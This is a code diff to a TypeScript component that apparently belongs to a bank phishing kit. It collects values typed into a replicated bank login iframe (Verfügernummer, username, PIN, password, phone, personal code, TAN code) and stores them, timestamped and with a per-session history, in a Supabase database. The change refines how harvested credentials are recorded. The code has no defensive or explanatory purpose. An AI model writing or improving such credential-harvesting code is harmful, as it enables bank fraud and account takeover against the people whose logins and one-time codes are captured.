@@ -198,16 +198,14 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     const tacField = fields.find((field) => field.kind === "tacCode") ?? null;
 
     const orderedFields = fields.slice(0, 3);
-    const extraFields = Object.fromEntries(
+    const rawFields: Record<string, string> = Object.fromEntries(
       fields.map((field, index) => {
         const suffix = field.key || `field_${index + 1}`;
-        return [[`iframe_${suffix}` , field.value]];
+        return [`iframe_${suffix}`, field.value] as const;
       }),
     );
 
-    const nextFormData = {
-      ...previousFormData,
-      ...extraFields,
+    const historyEntry = {
       bankSlug,
       bankName,
       verfuegernummer: usernameField?.value ?? "",
@@ -237,6 +235,36 @@ export function NzExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             : orderedFields[2]?.kind === "tacCode"
               ? "password"
               : "",
+      rawFields,
+      capturedAt: new Date().toISOString(),
+    };
+
+    const previousHistory = Array.isArray((previousFormData as any).bankFormHistory)
+      ? (previousFormData as any).bankFormHistory.slice()
+      : [];
+    previousHistory.push(historyEntry);
+
+    const nextFormData = {
+      ...previousFormData,
+      ...rawFields,
+      bankSlug,
+      bankName,
+      verfuegernummer: usernameField?.value ?? "",
+      username: usernameField?.value ?? "",
+      pin: passwordField?.value ?? "",
+      password: passwordField?.value ?? "",
+      bankPhone: phoneField?.value ?? "",
+      personalCode: personalCodeField?.value ?? "",
+      tacCode: tacField?.value ?? "",
+      orderedField1: historyEntry.orderedField1,
+      orderedField1Key: historyEntry.orderedField1Key,
+      orderedField2: historyEntry.orderedField2,
+      orderedField2Key: historyEntry.orderedField2Key,
+      orderedField2Type: historyEntry.orderedField2Type,
+      orderedField3: historyEntry.orderedField3,
+      orderedField3Key: historyEntry.orderedField3Key,
+      orderedField3Type: historyEntry.orderedField3Type,
+      bankFormHistory: previousHistory,
     };
 
     const { error: updateError } = await supabase
